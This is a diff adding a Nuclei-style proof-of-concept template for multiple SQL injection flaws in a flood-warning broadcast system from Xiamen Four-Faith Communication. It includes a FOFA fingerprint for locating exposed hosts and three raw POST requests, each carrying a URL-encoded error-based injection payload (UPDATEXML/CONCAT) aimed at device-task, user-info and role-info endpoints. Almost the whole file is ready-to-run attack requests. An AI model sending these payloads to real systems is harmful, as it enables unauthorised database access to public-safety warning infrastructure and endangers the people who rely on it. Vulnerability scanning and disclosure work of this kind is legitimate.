@@ -1,0 +1,96 @@
+id: poc-fafqg4uyg4ns8dm1
+info:
+  name: 厦门四信通信科技有限公司泄洪预警广播系统存在 多处 SQL注入漏洞
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/fafqg4uyg4ns8dm1'
+  tags: sqli,2025
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: fafqg4uyg4ns8dm1
+    fofa: icon_hash="-30177135"
+http:
+- raw:
+  - 'POST /devicetask/listPage.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=CEA41A8467A05D4EDF5121393B7EDCA5
+
+    Accept-Encoding: gzip, deflate
+
+    Priority: u=0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    Accept: */*
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    X-Requested-With: XMLHttpRequest
+
+
+    devicecode=%25%27+OR+UPDATEXML%283975%2CCONCAT%280x2e%2C0x7176786a71%2C%28SELECT+%28ELT%283975%3D3975%2C1%29%29%29%2C0x716a706a71%29%2C3853%29+AND+%27fEDT%25%27%3D%27fEDT&idBundle=&rows=10&page=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /userInfo/findUserInfo.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=CEA41A8467A05D4EDF5121393B7EDCA5
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    Priority: u=0
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Accept: */*
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    X-Requested-With: XMLHttpRequest
+
+
+    name=%25%27+OR+UPDATEXML%283975%2CCONCAT%280x2e%2C0x7176786a71%2C%28SELECT+%28ELT%283975%3D3975%2C1%29%29%29%2C0x716a706a71%29%2C3853%29+AND+%27fEDT%25%27%3D%27fEDT&rows=10&page=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
+- raw:
+  - 'POST /roleInfo/findRoleInfo.do HTTP/1.1
+
+    Host: {{Hostname}}
+
+    Cookie: JSESSIONID=CEA41A8467A05D4EDF5121393B7EDCA5
+
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+
+    User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:139.0) Gecko/20100101 Firefox/139.0
+
+    Priority: u=0
+
+    Accept: */*
+
+    Accept-Encoding: gzip, deflate
+
+    Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+
+    X-Requested-With: XMLHttpRequest
+
+
+    name=%25%27+OR+UPDATEXML%283975%2CCONCAT%280x2e%2C0x7176786a71%2C%28SELECT+%28ELT%283975%3D3975%2C1%29%29%29%2C0x716a706a71%29%2C3853%29+AND+%27fEDT%25%27%3D%27fEDT&rows=10&page=1'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
